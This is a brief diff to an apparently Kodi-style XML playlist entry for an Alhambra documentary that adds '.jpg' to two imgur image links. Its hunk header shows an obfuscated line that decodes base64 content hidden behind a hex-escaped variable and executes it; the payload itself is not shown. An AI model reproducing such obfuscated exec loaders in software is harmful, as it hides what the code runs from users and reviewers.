@@ -94,8 +94,8 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <page></page>
 </regex>
 <info>En el corazón de Andalucía, se encuentra la Fortaleza de la Alhambra. Este documental revela los increíbles logros arquitectónicos que esconde este antiguo monumento construido hace más de 800 años por los nazaríes.</info>
-<thumbnail>https://imgur.com/TybvPAL</thumbnail>
-<fanart>https://imgur.com/XS90w8b</fanart>
+<thumbnail>https://imgur.com/TybvPAL.jpg</thumbnail>
+<fanart>https://imgur.com/XS90w8b.jpg</fanart>
 </item>
 
 
